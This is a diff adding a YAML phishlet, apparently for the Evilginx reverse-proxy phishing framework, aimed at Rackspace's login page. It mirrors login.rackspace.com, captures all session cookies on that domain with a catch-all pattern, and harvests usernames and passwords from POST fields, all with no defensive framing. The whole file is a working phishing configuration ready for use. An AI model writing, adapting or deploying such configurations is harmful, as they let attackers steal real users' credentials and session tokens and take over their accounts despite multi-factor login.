@@ -1,0 +1,30 @@
+
+author: '@An0nud4y' 
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'rackspace.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'rackspace.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'login.rackspace.com', orig_sub: 'login', domain: 'rackspace.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.rackspace.com', orig_sub: '', domain: 'rackspace.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: 'login.rackspace.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - ''  
+credentials:
+  username:
+    key: 'name="username"'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'name="password"'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.rackspace.com'
+  path: '/login' 
+  
